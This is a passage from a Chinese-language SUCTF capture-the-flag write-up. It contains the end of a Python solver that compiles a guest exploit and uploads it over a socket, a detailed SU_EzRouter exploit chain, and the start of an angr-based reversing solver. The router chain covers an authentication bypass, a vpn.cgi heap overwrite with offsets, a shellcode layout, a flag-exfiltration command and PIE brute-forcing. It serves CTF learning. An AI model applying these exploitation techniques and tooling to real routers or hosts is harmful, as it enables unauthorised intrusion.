        return path.is_file() and path.read_bytes()[:4] == ELF_MAGIC
    except OSError:
        return False

def read_guest_exp(path: Path) -> bytes:
    blob = path.read_bytes()
    if blob[:4] != ELF_MAGIC:
        raise RuntimeError(f"{path} exists but is not a Linux ELF payload")
    return blob

def iter_zig_paths(workdir: Path):
    seen = set()
    for candidate in sorted((workdir / ".tools").glob("**/zig.exe")):
        resolved = str(candidate.resolve())
        if resolved not in seen:
            seen.add(resolved)
            yield resolved

    for name in ("zig", "zig.exe"):
        candidate = shutil.which(name)
        if candidate and candidate not in seen:
            seen.add(candidate)
            yield candidate

def cc_targets_linux(cc: str) -> bool:
    try:
        proc = subprocess.run(
            [cc, "-dumpmachine"],
            capture_output=True,
            text=True,
            check=True,
        )
    except (OSError, subprocess.CalledProcessError):
        return False
    return "linux" in proc.stdout.strip().lower()

def try_run(cmd, workdir: Path) -> tuple[bool, str]:
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            cwd=str(workdir),
        )
    except (OSError, subprocess.CalledProcessError) as exc:
        if isinstance(exc, subprocess.CalledProcessError):
            detail = (exc.stderr or exc.stdout or str(exc)).strip()
        else:
            detail = str(exc)
        return False, detail
    return True, (proc.stderr or proc.stdout).strip()

def compile_guest_exp(src: Path, out: Path, workdir: Path) -> None:
    errors = []

    for zig in iter_zig_paths(workdir):
        ok, detail = try_run(
            [
                zig,
                "cc",
                "-target",
                "x86_64-linux-musl",
                "-static",
                "-O2",
                "-s",
                str(src),
                "-o",
                str(out),
            ],
            workdir,
        )
        if ok and is_linux_elf(out):
            return
        errors.append(f"zig failed: {detail or 'output was not a Linux ELF'}")

    for cc in ("x86_64-linux-musl-gcc", "musl-gcc", "x86_64-linux-gnu-gcc", "gcc"):
        resolved = shutil.which(cc)
        if not resolved:
            continue
        if not cc_targets_linux(resolved):
            errors.append(f"skip {resolved}: target is not Linux")
            continue
        ok, detail = try_run(
            [resolved, "-static", "-O2", "-s", str(src), "-o", str(out)],
            workdir,
        )
        if ok and is_linux_elf(out):
            return
        errors.append(f"{resolved} failed: {detail or 'output was not a Linux ELF'}")

    wsl = shutil.which("wsl")
    if wsl:
        wsl_src = to_wsl_path(src.resolve())
        wsl_out = to_wsl_path(out.resolve())
        ok, _detail = try_run(
            [wsl, "-e", "bash", "-lc", f"gcc -static -O2 -s {wsl_src} -o {wsl_out}"],
            workdir,
        )
        if ok and is_linux_elf(out):
            return
        errors.append("wsl gcc failed: WSL is installed but not currently usable")

    if not errors:
        errors.append("no usable Linux compiler found")
    joined = "\n  - ".join(errors)
    raise RuntimeError(
        "failed to build a Linux guest payload.\n"
        "Provide `--guest-bin`, install `zig`, or add a Linux-targeting gcc toolchain.\n"
        f"  - {joined}"
    )

def build_guest_exp(workdir: Path, guest_bin: Path | None) -> bytes:
    if guest_bin is not None:
        return read_guest_exp(guest_bin)

    cached = workdir / "guest_exp"
    if is_linux_elf(cached):
        return read_guest_exp(cached)

    with tempfile.TemporaryDirectory(dir=str(workdir)) as tmpdir:
        tmp = Path(tmpdir)
        src = tmp / "guest_exp.c"
        out = tmp / "guest_exp"
        src.write_text(GUEST_EXP_C, encoding="ascii")
        compile_guest_exp(src, out, workdir)
        return out.read_bytes()

class SocketTube:
    def __init__(self, host: str, port: int):
        try:
            self.sock = socket.create_connection((host, port), timeout=10)
        except OSError as exc:
            raise RuntimeError(f"failed to connect to {host}:{port}: {exc}") from exc
        self.sock.settimeout(0.2)

    def recv(self, size: int = 4096) -> bytes:
        try:
            return self.sock.recv(size)
        except socket.timeout:
            return b""

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def close(self) -> None:
        self.sock.close()

class ProcTube:
    def __init__(self, cmd, cwd: Path):
        self.proc = subprocess.Popen(
            cmd,
            cwd=str(cwd),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )

    def recv(self, size: int = 4096) -> bytes:
        return self.proc.stdout.read1(size)

    def send(self, data: bytes) -> None:
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def close(self) -> None:
        self.proc.terminate()
        try:
            self.proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            self.proc.kill()

class DrainBuffer:
    def __init__(self, tube):
        self.tube = tube
        self.buf = bytearray()
        self.stop_evt = threading.Event()
        self.thr = threading.Thread(target=self._run, daemon=True)

    def _run(self) -> None:
        while not self.stop_evt.is_set():
            chunk = self.tube.recv()
            if chunk:
                self.buf.extend(chunk)
            else:
                time.sleep(0.02)

    def start(self) -> None:
        self.thr.start()

    def snapshot(self) -> bytes:
        return bytes(self.buf)

    def stop(self) -> bytes:
        self.stop_evt.set()
        self.thr.join(timeout=1)
        return bytes(self.buf)

def recv_until(tube, marker: bytes, timeout: float) -> bytes:
    end = time.time() + timeout
    data = bytearray()
    while time.time() < end:
        chunk = tube.recv()
        if chunk:
            data.extend(chunk)
            if marker in strip_ansi(bytes(data)):
                return bytes(data)
        else:
            time.sleep(0.05)
    raise TimeoutError(f"timed out waiting for {marker!r}")

def send_line(tube, line: str) -> None:
    tube.send(line.encode() + b"\n")

def upload_and_run(tube, payload: bytes, wait_seconds: float = 25.0) -> bytes:
    recv_until(tube, PROMPT, 25)
    send_line(tube, "stty -echo")
    recv_until(tube, PROMPT, 5)
    send_line(tube, "export PS2=''")
    recv_until(tube, PROMPT, 5)

    drainer = DrainBuffer(tube)
    drainer.start()

    blob = base64.b64encode(gzip.compress(payload)).decode()
    send_line(tube, "cat >/tmp/exp.b64 <<'EOF'")
    for i in range(0, len(blob), 1024):
        send_line(tube, blob[i : i + 1024])
    send_line(tube, "EOF")
    send_line(tube, "base64 -d /tmp/exp.b64 | gzip -d >/tmp/exp")
    send_line(tube, "chmod +x /tmp/exp")
    send_line(tube, "/tmp/exp")

    deadline = time.time() + wait_seconds
    saw_start = False
    while time.time() < deadline:
        clean = strip_ansi(drainer.snapshot())
        if b"SUCTF{" in clean:
            break
        if not saw_start and b"guest_exp start" in clean:
            saw_start = True
            deadline = max(deadline, time.time() + 12)
        time.sleep(0.1)
    return drainer.stop()

def make_local_tube(workdir: Path):
    if not (workdir / "bzImage").exists() or not (workdir / "initramfs.cpio.gz").exists():
        raise RuntimeError("local mode requires bzImage and initramfs.cpio.gz in the current directory")

    cmd = qemu_cmd()
    if shutil.which("qemu-system-x86_64"):
        return ProcTube(cmd, workdir)
    if shutil.which("wsl"):
        wsl_dir = to_wsl_path(workdir.resolve())
        wsl_cmd = shlex.join(cmd)
        return ProcTube(["wsl", "-e", "bash", "-lc", f"cd {wsl_dir} && {wsl_cmd}"], workdir)
    raise RuntimeError("qemu-system-x86_64 not found; install qemu or use WSL")

def main() -> int:
    parser = argparse.ArgumentParser(description="Chronos Ring solver")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--local", action="store_true", help="run against local qemu instead of remote nc")
    parser.add_argument("--guest-bin", type=Path, help="use a prebuilt Linux ELF guest payload")
    args = parser.parse_args()

    workdir = Path(__file__).resolve().parent
    payload = build_guest_exp(workdir, args.guest_bin)

    if args.local:
        tube = make_local_tube(workdir)
    else:
        tube = SocketTube(args.host, args.port)

    try:
        out = upload_and_run(tube, payload)
        sys.stdout.buffer.write(strip_ansi(out))
    finally:
        tube.close()
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
SUCTF{JEQG2YLEMUQGCIDNNFZXIYLLMUWCASJANBXXAZJAPFXXKIDXN5XCO5BANVQWWZJANF2A====}
```

## SU_EzRouter 

**1. 题目概述**

这题只给了一个在线环境：

```Plain
http://web-df30d06398.adworld.xctf.org.cn:80/
```

没有额外附件，也没有本地二进制。

**2. 环境补全与实际验证**

这题在线环境本身就能补全分析所需内容。

**2.1 未授权登录**

直接访问：

```HTTP
GET /www/http?auth=1&action=login
```

服务端会返回 `302`，同时下发有效的 `session_id`。

我在远程环境上的实际验证结果：

```Plain
302
{'session_id': '2089f6a34bb8b30a17ced03b4251d520'}
Location: /control.html
```

这说明后台认证可以被直接绕过，不需要用户名和密码。

**2.2 固件下载**

拿到 cookie 后，请求：

```HTTP
GET /cgi-bin/download.cgi
```

返回内容是完整固件 zip。远程实测：

```Plain
HTTP 200
长度: 93805
Magic: PK\x03\x04
SHA256: b03fa7b25a4c2fd3fb483318d1821cdb618d28bb7293b572c06b3d6826c0f2d4
```

这与原 WP 中给出的哈希一致，说明在线环境与题解所针对的固件版本一致，可以直接按这条链分析。

**3. 先看几个关键组件**

**3.1****`http`**

`http` 负责：

1. 处理静态文件。
2. 转发 CGI。
3. 处理 `/www/http?auth=...&action=...` 这种特殊逻辑。

这里最关键的是：

1. `/www/http?auth=1&action=login` 可以直接生成有效会话。
2. 拿到会话后就能访问其他 CGI，包括固件下载接口。

它本身不是最终 RCE 点，但它提供了进入题目的两个前提：

1. 未授权登录。
2. 未授权下载固件。

**3.2****`download.cgi`**

这个接口逻辑非常简单，核心就是读取相对路径 `./FILE` 并返回给用户。

也就是说，只要我们最终能把 `/app/FILE` 的内容改成 flag，那么再次访问 `download.cgi` 时，就能稳定拿到 flag 内容，而不是固件 zip。

这就是本题的回显通道。

**3.3****`vpn.cgi`**

真正的入口在这里。它接收 JSON，并把字段拼进一块栈缓冲区，然后调用 `CFG_SET` 把消息投递给后端持久进程 `mainproc`。

利用分成三步：

1. `action=set`：创建 VPN 对象，同时把我们预埋的 shellcode 放进对象内容。
2. `action=edit`：利用被污染的 `custom_ptr` 做相对写，部分覆写对象开头和回调指针。
3. `action=apply`：触发 `callback(vpn)`，把控制流劫持到堆上的 shellcode。

**3.4****`mainproc`**

`mainproc` 是真正处理 VPN 配置的后端进程，也是漏洞落点。WP 中涉及的关键函数偏移如下：

```Plain
make_heap_executable  0x1389
default_vpn_apply     0x140d
Set_VPN               0x1775
Edit_VPN_Custom       0x1a8f
Apply_VPN             0x1b39
```

关键对象成员：

```Plain
[vpn+0x10]  callback
[vpn+0xe8]  custom_ptr
```

`Apply_VPN` 的核心行为是：

```C
if (vpn_list && vpn_list->callback) {
    callback(vpn_list);
}
```

所以只要把 `[vpn+0x10]` 改成可控地址，就能拿到 RIP。

**4. 漏洞链还原**

**4.1****`vpn.cgi`** **的字段布局**

`vpn.cgi` 把 JSON 字段按固定偏移放进一块大缓冲区：

```Plain
+0x00  action  0x20
+0x20  name    0x20
+0x40  proto   0x20
+0x60  server  0x30
+0x90  user    0x20
+0xb0  pass    0x20
+0xd0  cert    0x08
+0xd9  custom  0xbb8
```

对应的三个动作分别会把不同消息送到 `mainproc`：

```Plain
action=set   -> CFG_SET(..., buf, 0x0c91)
action=edit  -> CFG_SET(..., custom, custom_len)
action=apply -> CFG_SET(..., &one, 4)
```

**4.2****`extract_json_string`** **的 NUL 终止缺陷**

这个函数有一个很关键的细节：

1. 最多只拷贝 `max` 字节。
2. 只有当实际长度 `< max` 时才补 `\0`。
3. 如果输入长度恰好等于 `max`，目标缓冲区不会自动 NUL 终止。

这意味着 `name/proto/server/user/pass` 这些字段都可以被构造成“刚好填满且没有 `\0`”的字符串。只要后端再拿这些字段去 `strcpy`，就会一直向后串读，直到遇见后续某个位置的零字节。

**4.3****`Set_VPN`** **内部溢出**

`Set_VPN` 会先创建 `vpn` 对象，再单独分配 `custom_ptr`：

```C
vpn = malloc(240);
custom_len = *(uint16_t *)(src + 0xd9);
custom_ptr = malloc(custom_len + 1);
memcpy(custom_ptr, src + 0xd9, custom_len);
custom_ptr[custom_len] = 0;
vpn->callback = default_vpn_apply;
strcpy(vpn+0x18, src+0x00...);
...
*(uint64_t *)(vpn+0x08) = *(uint64_t *)(src+0xd0); // cert
```

利用点在于：

1. 让 `pass` 恰好占满 `0x20` 且无 `\0`。
2. 让 `cert` 为 `"\xb0"`。
3. 最后一个 `strcpy(vpn+0xc8, src+0xb0)` 会越过 `pass`，继续读到 `cert`，并覆盖到 `[vpn+0xe8]`，也就是 `custom_ptr`。

于是我们把 `custom_ptr` 从“原本真正分配出来的缓冲区”打偏到“与 `vpn` 同页、低地址为 `...00b0` 的位置”。

```Plain
正常情况下: custom_ptr = vpn + 0x100
覆写以后:   custom_ptr = ...00b0
```

如果此时：

```Plain
vpn low16 == 0x02a0
```

那么就会出现非常理想的对齐关系：

```Plain
custom_ptr + 0x1f0 = vpn
custom_ptr + 0x1f8 = vpn + 0x8
custom_ptr + 0x200 = vpn + 0x10
```

这就是第二阶段相对写的基础。

**4.4****`Edit_VPN_Custom`** **作为第二阶段写原语**

`Edit_VPN_Custom` 的逻辑是：

```C
len = min(vpn->custom_len, msg->len);
memcpy(vpn->custom_ptr, msg->data, len);
```

因为这里不会重新分配 `custom_ptr`，而是直接向被我们污染后的指针地址写入，所以它相当于给了我们一个稳定的相对写。

写入的关键内容是：

```Plain
0x1f0: eb 06 90 90 90 90 90 90
0x1f8: eb 2e 90 90 90 90 90 90
0x200: callback 的低两字节
```

这样做的结果有两个：

1. 在对象头部埋入两段短跳，供后续 `jmp rdi` 落到对象起始位置后继续跳进真正 shellcode。
2. 用部分覆写修改 `callback` 指针。

**4.5 两次****`apply`** **完成控制流劫持**

初始回调是：

```Plain
default_vpn_apply = mainproc_base + 0x140d
```

第一次 `edit + apply`，把它改成：

```Plain
make_heap_executable = mainproc_base + 0x1389
```

目的不是直接执行 shellcode，而是先把当前堆页改成可执行。

第二次 `edit + apply`，再把回调改成：

```Plain
jmp rdi = mainproc_base + 0x1c21
```

此时 `Apply_VPN` 调用的是：

```Plain
callback(vpn)
```

也就是说：

```Plain
rdi = vpn
call callback
=> jmp rdi
=> rip = vpn
```

控制流直接跳到堆上的 VPN 对象起始地址。

**5. Shellcode 布局**

因为对象头前 16 字节已经被第二阶段 `edit` 覆写，所以 shellcode 不是从 `vpn+0x0` 直接开始，而是用短跳板跳到后面的真实代码区。

利用布局为：

```Plain
vpn+0x00: eb 06
vpn+0x08: eb 2e
vpn+0x18: shellcode 起始区域
```

执行路径：

1. 先跳到 `vpn+0x08`
2. 再跳到 `vpn+0x38`
3. 落到 `name/proto/server/user/pass` 中预埋的 shellcode

最终 shellcode 执行的命令是：

```Bash
find / -maxdepth 2 -name flag* 2>/dev/null|xargs cat>/app/FILE
```

这样做有两个好处：

1. 不依赖固定 flag 路径。
2. 直接把 flag 写进 `/app/FILE`，天然适配 `download.cgi` 的回显方式。

**6. 为什么需要爆破**

这条链不是确定性触发，至少要同时满足两个随机条件。

**6.1 堆地址条件**

要让第二阶段偏移刚好命中 `vpn / vpn+8 / vpn+0x10`，需要：

```Plain
vpn low16 == 0x02a0
```

命中率约为：

```Plain
1 / 16
```

**6.2 PIE 低位条件**

回调函数在 PIE 内，部分覆写时还要猜中对应页号低 4 bit。原始 WP 中给出的候选模式是：

```Plain
0x140d, 0x240d, 0x340d, ... , 0xf40d
```

所以这里也有一个：

```Plain
1 / 16
```

**6.3 总体成功率**

两个条件叠加后，总命中率约为：

```Plain
1 / 256
```

因此远程利用的正确姿势不是“打一次”，而是：

1. 调用 `restart.sh` 重启后端。
2. 每次重启后猜一个 PIE 低位。
3. 循环直到命中。

```Plain
[+] attempt 145
[.] pie guess k=0 make_hi=0x13 jmp_hi=0x1c
[+] non-zip response:
SUCTF{ExCeED_4UThOR1Ty_W1tH_1pc}
```

# Reverse

## SU_West

**一、初步分析**

先看程序入口 `main`，可以很快得到整体流程：

1. 先做一次反调试检测。
2. 收集输入。
3. 当输入全部收集完成后，进入验证逻辑。
4. 验证成功时打印 `flag: %.*s`，随后输出 `correct`。

从导出的反编译结果里可以直接看到几个关键字符串：

- `all inputs collected, starting verification...`
- `correct`
- `incorrect at round %zu (layer %u)`
- `flag: %.*s`

这说明题目是一个标准的“给出一串正确输入，程序在验证通过后打印 flag”的逆向题。

**二、输入格式**

**1. 交互输入**

`sub_1400012C0` 会循环读取 81 次输入，每次调用 `sub_140013070` 检查格式。

**2. 命令行输入**

如果程序有命令行参数，则走 `sub_140012F90`，将参数按 `,` 分割成 81 段，再逐段做同样的格式检查。

**3. 单个输入的限制**

`sub_140013070` 的逻辑比较直接：

- 只能包含数字字符。
- 长度必须正好为 16。
- 作为十进制整数解析后，范围必须在 `10^15 <= x < 10^16`。

因此整题目标就是求出 **81 个 16 位十进制整数**。

**三、验证框架识别**

**1. 81 轮验证**

`sub_1400013B0` 中有一个固定的 81 次循环：

- 当前轮号写入状态结构。
- 从 `byte_14003DEE0` 取出一个索引。
- 通过函数表 `funcs_140001499` 调用对应的校验函数。

这里最关键的一点是：

- `byte_14003DEE0` 不是简单的顺序调用。

\- 实际调用顺序由一个 **长度为 81 的置换表** 决定。

- 真正的函数指针表位于 `.rdata` 段的 `0x14002A480`。

也就是说，程序不是“按地址顺序跑 81 个函数”，而是“按置换顺序从函数表里取 81 个函数”。

**2. 状态结构**

`sub_1400013B0` 初始化了一个 68 字节左右的状态：

- `+0x00`：主状态 `s0`
- `+0x08`：当前 round
- `+0x10`：辅助状态 `s2`
- `+0x18`：计数器 `ctr`
- `+0x1C`：40 字节 flag 缓冲区

初始值为：

```Plain
s0  = 0x669E1E61279D826E
s2  = 0xA03AB9F27C4C6BFB
ctr = 0
flag[40] = 两个 xmmword 常量 + 一个 qword 常量拼起来的 40 字节
```

最终打印的 flag 正是这 40 字节缓冲区在 81 轮变换后的结果。

**四、81 个校验函数的公共模板**

虽然导出了 81 个独立函数，但仔细看会发现它们结构几乎完全一致，只是：

- 使用的配置块不同；
- 校验常量不同；
- 中间混淆表达式不同。

每一轮都大致满足下面的模板：

```C
precheck_with_sub_140001100(...);

v7  = sub_140012480(input, state->s0, round, cfg, idx);
v8  = sub_140012630(v7, state->s0, round, cfg, idx);
v9  = sub_140012780(v8, v7, state->s0, round, cfg);
v10 = sub_140012940(v8, round, cfg);

if (v10 != CONST_ROUND)
    return 0;

...一堆和 v7/v8/v9/v10 相关的校验/状态更新...

flag_mix = sub_140012B90(...);
sub_140012C00(flag_buf, flag_mix, round);
state->s0 = sub_140012CA0(...);

return 1;
```

这类题如果手搓 81 个函数，工作量会非常大，而且很容易抄错。更好的方法是把它看成：

\- **一套公共框架**

\- 配合 **81 组配置数据**

\- 再加上 **每轮的目标常量**

**五、关键观察：真正决定输入是否合法的是`sub_140012940`**

继续抽象后可以发现，输入到目标常量的依赖主链是：

```Plain
input
  -> sub_140012480
  -> sub_140012630
  -> sub_140012940
  -> 与该轮常量比较
```

也就是：

```Plain
sub_140012940(
    sub_140012630(
        sub_140012480(input, state, round, cfg, idx)
    ),
    round,
    cfg
) == round_const
```

这三层有两个重要特征：

1. 都是按位运算、加法、循环移位组成的 ARX/Feistel 风格结构。
2. **都是可逆的**。

于是整题可以从“正向猜输入”变成“反向推输入”。

**六、求解策略**

**1. 静态部分**

先从导出数据中提取：

- 81 个 round 的调用顺序 `byte_14003DEE0`
- 81 个真实函数地址（从 `.rdata` 函数表取）
- 81 个配置块地址
- 每个校验函数中 `sub_140012940(...)` 比较用的常量

配置块本身是数据驱动的，地址从 `0x14002A710` 开始，步长固定为 `0xC0`。

**2. 逆推输入**

对每一轮，按下面的顺序逆推：

```Plain
target_const
  -> inverse(sub_140012940)
  -> inverse(sub_140012630)
  -> inverse(sub_140012480)
  -> input
```

得到候选输入后，再做两件事：

1. 检查它是否落在 16 位十进制整数范围内。
2. 再正向跑一遍三层公共变换，确认结果确实回到该轮常量。

**3. 为什么还要“执行原始机器码”**

仅仅求出输入还不够，因为下一轮依赖前一轮更新后的状态和 flag 缓冲区。

而每个 round 函数后半段虽然模板一致，但混淆表达式很多，完全手写所有状态更新细节很费劲。

因此我的做法是：

\- **输入求解**：自己还原并逆推三层公共变换。

\- **状态推进**：拿到该轮输入后，直接让原始 round 函数在模拟器里具体执行一遍，只 hook `sub_140001100` 这个辅助函数。

这样做的优点是：

- 不用手抄 81 个尾部状态更新逻辑。
- 仍然能保证每轮推进后的 `s0 / s2 / flag_buf` 与原程序一致。

**七、自动化实现**

我把完整求解脚本写成了：

```Python
from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
import re
import struct

import angr
import claripy

ROOT = Path(__file__).resolve().parent
EXPORT = ROOT / "export-for-ai"
MEM_DIR = EXPORT / "memory"
EXE = ROOT / "Journey_to_the_West.exe"

MASK64 = (1 << 64) - 1
MASK32 = (1 << 32) - 1

def rol64(value: int, shift: int) -> int:
    shift &= 63
    value &= MASK64
    return ((value << shift) | (value >> (64 - shift))) & MASK64 if shift else value

def ror64(value: int, shift: int) -> int:
    shift &= 63
    value &= MASK64
    return ((value >> shift) | (value << (64 - shift))) & MASK64 if shift else value

def rol32(value: int, shift: int) -> int:
    shift &= 31
    value &= MASK32
    return ((value << shift) | (value >> (32 - shift))) & MASK32 if shift else value

def ror32(value: int, shift: int) -> int:
    shift &= 31
    value &= MASK32
    return ((value >> shift) | (value << (32 - shift))) & MASK32 if shift else value

def ror8(value: int, shift: int) -> int:
    shift &= 7
    value &= 0xFF
    return ((value >> shift) | (value << (8 - shift))) & 0xFF if shift else value

def is_bv(value) -> bool:
    return isinstance(value, claripy.ast.Base)

def bv32(value):
    if is_bv(value):
        if value.size() == 32:
            return value
        return claripy.Extract(31, 0, value)
    return claripy.BVV(value & MASK32, 32)

def bv64(value):
    if is_bv(value):
        if value.size() == 64:
            return value
        if value.size() < 64:
            return claripy.ZeroExt(64 - value.size(), value)
        return claripy.Extract(63, 0, value)
    return claripy.BVV(value & MASK64, 64)

def lo32(value):
    if is_bv(value):
        return claripy.Extract(31, 0, value)
    return value & MASK32

def hi32(value):
    if is_bv(value):
        return claripy.Extract(63, 32, value)
    return (value >> 32) & MASK32

def join_u64(hi, lo):
    if is_bv(hi) or is_bv(lo):
        return claripy.Concat(bv32(hi), bv32(lo))
    return ((hi & MASK32) << 32) | (lo & MASK32)

def rol64_any(value, shift: int):
    if is_bv(value):
        return claripy.RotateLeft(bv64(value), shift & 63)
    return rol64(value, shift)

def rol32_any(value, shift: int):
    if is_bv(value):
        return claripy.RotateLeft(bv32(value), shift & 31)
    return rol32(value, shift)

def ror32_any(value, shift: int):
    if is_bv(value):
        return claripy.RotateRight(bv32(value), shift & 31)
    return ror32(value, shift)

def add32(a, b):
    if is_bv(a) or is_bv(b):
        return bv32(bv32(a) + bv32(b))
    return (a + b) & MASK32

def xor32(a, b):
    if is_bv(a) or is_bv(b):
        return bv32(bv32(a) ^ bv32(b))
    return (a ^ b) & MASK32

def xor64(a, b):
    if is_bv(a) or is_bv(b):
        return bv64(bv64(a) ^ bv64(b))
    return (a ^ b) & MASK64

class MemoryImage:
    def __init__(self) -> None:
        self._segments: list[tuple[int, bytearray]] = []
        for path in sorted(MEM_DIR.glob("*.txt")):
            first, last = path.stem.split("--")
            start = int(first, 16)
            end = int(last, 16)
            data = bytearray(end - start)
            with path.open("r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    if " | " not in line:
                        continue
                    parts = line.rstrip("\n").split(" | ")
                    if len(parts) < 2:
                        continue
                    try:
                        addr = int(parts[0], 16)
                    except ValueError:
                        continue
                    hex_bytes = parts[1].strip().split()
                    raw = bytes(int(b, 16) for b in hex_bytes)
                    off = addr - start
                    data[off : off + len(raw)] = raw
            self._segments.append((start, data))

    def _find(self, addr: int, size: int) -> tuple[bytearray, int]:
        for start, data in self._segments:
            off = addr - start
            if 0 <= off and off + size <= len(data):
                return data, off
        raise KeyError(hex(addr))

    def read(self, addr: int, size: int) -> bytes:
        data, off = self._find(addr, size)
        return bytes(data[off : off + size])

    def u8(self, addr: int) -> int:
        return self.read(addr, 1)[0]

    def u32(self, addr: int) -> int:
        return struct.unpack("<I", self.read(addr, 4))[0]

    def u64(self, addr: int) -> int:
        return struct.unpack("<Q", self.read(addr, 8))[0]

    def bytes(self, addr: int, size: int) -> list[int]:
        return list(self.read(addr, size))

@dataclass
class State:
    s0: int
    round_idx: int
    s2: int
    ctr: int
    flag: bytearray

    def pack(self) -> bytes:
        return (
            struct.pack("<Q", self.s0)
            + struct.pack("<Q", self.round_idx)
            + struct.pack("<Q", self.s2)
            + struct.pack("<I", self.ctr & 0xFFFFFFFF)
            + bytes(self.flag)
        )

    @classmethod
    def unpack_from(cls, blob: bytes) -> "State":
        return cls(
            s0=struct.unpack_from("<Q", blob, 0)[0],
            round_idx=struct.unpack_from("<Q", blob, 8)[0],
            s2=struct.unpack_from("<Q", blob, 16)[0],
            ctr=struct.unpack_from("<I", blob, 24)[0],
            flag=bytearray(blob[28 : 28 + 40]),
        )

IMG = MemoryImage()

LAYER_SEQ_ADDR = 0x14003DEE0
FLAG_INIT_ADDR = 0x14003E1D0
CONFIG_BASE = 0x14002A710
CONFIG_STRIDE = 0xC0

def init_state() -> State:
    flag = bytearray(IMG.read(FLAG_INIT_ADDR, 32))
    flag += struct.pack("<Q", 0x781C14C709915BCF)
    return State(
        s0=0x669E1E61279D826E,
        round_idx=0,
        s2=0xA03AB9F27C4C6BFB,
        ctr=0,
        flag=flag,
    )

def layer_seq() -> list[int]:
    return IMG.bytes(LAYER_SEQ_ADDR, 81)

def cfg_addr(layer: int) -> int:
    return CONFIG_BASE + layer * CONFIG_STRIDE

def dump_basics() -> None:
    seq = layer_seq()
    print("layers:", seq)
    print("flag-init:", init_state().flag.hex())
    for layer in range(16):
        base = cfg_addr(layer)
        print(
            f"layer {layer:02d} cfg={base:#x} "
            f"size={IMG.u64(base + 184)} ptr={IMG.u64(base + 176):#x} "
            f"bytes160-171={IMG.read(base + 160, 12).hex()}"
        )

def round_function_addrs() -> list[int]:
    addrs: list[int] = []
    for path in sorted((EXPORT / "decompile").glob("sub_*.c")):
        txt = path.read_text(encoding="utf-8", errors="ignore")
        m = re.search(r"func-address: 0x([0-9a-f]+)", txt)
        if not m:
            continue
        addr = int(m.group(1), 16)
        if 0x140001EB0 <= addr <= 0x1400120E0:
            addrs.append(addr)
    return sorted(addrs)

def round_metadata() -> list[tuple[int, int, int]]:
    out: list[tuple[int, int, int]] = []
    for path in sorted((EXPORT / "decompile").glob("sub_*.c")):
        txt = path.read_text(encoding="utf-8", errors="ignore")
        m_addr = re.search(r"func-address: 0x([0-9a-f]+)", txt)
        if not m_addr:
            continue
        addr = int(m_addr.group(1), 16)
        if not (0x140001EB0 <= addr <= 0x1400120E0):
            continue
        m_cfg = re.search(r"&unk_(14002[0-9A-Fa-f]+)", txt)
        if not m_cfg:
            raise ValueError(f"missing cfg in {path.name}")
        cfg = int(m_cfg.group(1), 16)
        m_const = re.search(r"!=\s*(0x[0-9A-Fa-f]+)u?LL", txt)
        if m_const:
            const = int(m_const.group(1), 16)
        else:
            m_const = re.search(r"v\d+\s*==\s*(0x[0-9A-Fa-f]+)u?LL", txt)
            if not m_const:
                raise ValueError(f"missing compare constant in {path.name}")
            const = int(m_const.group(1), 16)
        out.append((addr, cfg, const))
    return sorted(out)

ROUND_FUNCS = round_function_addrs()
ROUND_META = round_metadata()
PROJ = angr.Project(str(EXE), auto_load_libs=False)
CC = angr.calling_conventions.SimCCMicrosoftAMD64(PROJ.arch)
SENTINEL = 0x5000000
STATE_ADDR = 0x6000000

def cfg_qword(cfg: int, index: int) -> int:
    return IMG.u64(cfg + 8 * index)

def splitmix64_step_concrete(state: int) -> tuple[int, int]:
    state = (state - 0x61C8864680B583EB) & MASK64
    z = (0xBF58476D1CE4E5B9 * (state ^ (state >> 30))) & MASK64
    z = (0x94D049BB133111EB * (z ^ (z >> 27))) & MASK64
    return state, (z ^ (z >> 31)) & MASK64

def helper_12480(a1, a2: int, a3: int, cfg: int, a5: int):
    init = xor64(IMG.u64(cfg + 40), a1)
    high = hi32(init)
    low = lo32(init)
    v6 = 0xA24BAED4963EE407
    v8 = IMG.u8(cfg + 162)
    v20 = v8 + a3 + 7
    v9 = v8 + a3 + 6
    v10 = v8 + a3
    v19 = a3 + v8 + 1
    v23 = (
        cfg_qword(cfg, 0)
        ^ ((0xD6E8FEB86659FD93 * a5) & MASK64)
        ^ a2
        ^ ((0x9E3779B97F4A7C15 - 0x61C8864680B583EB * a3) & MASK64)
    ) & MASK64
    rounds = IMG.u8(cfg + 161) + 6
    i = 0
    while i != rounds:
        prev_high = high
        prev_low = low
        v14 = 31 * (v10 // 0x1F)
        v15 = v20 - 31 * ((v9 - v14) // 0x1F) - v14
        v16 = cfg_qword(cfg, (i & 3) + 1) ^ v6 ^ v23
        t = rol32_any(xor32(lo32(v16), prev_low), i + v19 - v14)
        v17 = xor32(prev_high, add32(t, xor32(prev_low, hi32(v16))))
        low = xor32(v17, add32(lo32(v16), ror32_any(prev_low, i + v15)))
        high = prev_low
        v6 = (v6 - 0x5DB4512B69C11BF9) & MASK64
        v9 += 1
        v10 += 1
        i += 1
    return join_u64(high, low)

def helper_12630(a1, a2: int, a3: int, cfg: int, a5: int):
    v19 = IMG.u8(cfg + 163)
    v18 = a3 + a5 + v19 + 1
    v6 = a3 + v19
    v7 = (0x6B2FB644ECCEEE15 * a3) & MASK64
    v8 = 0xBF58476D1CE4E5B9
    v9 = xor64(
        xor64(
            xor64(
                xor64(a2, IMG.u64(cfg + 40)),
                (0xA24BAED4963EE407 * a5) & MASK64,
            ),
            a1,
        ),
        (0x9E3779B97F4A7C15 - 0x61C8864680B583EB * a3) & MASK64,
    )
    rounds = IMG.u8(cfg + 160) + 2
    v11 = a5 + v6
    v12 = (0x94D049BB133111EB - v7) & MASK64
    v14 = v12
    i = 0
    while i != rounds:
        q1 = cfg_qword(cfg, ((i & 3) + 11))
        q2 = cfg_qword(cfg, (((i + v19) & 3) + 15))
        v16 = xor64(xor64(a2, v8), q1)
        rot = v18 + i - 63 * (v11 // 0x3F)
        tmp = v16 + rol64_any(xor64(xor64(q2, v14), v9), rot)
        v9 = bv64(tmp) if is_bv(tmp) else (tmp & MASK64)
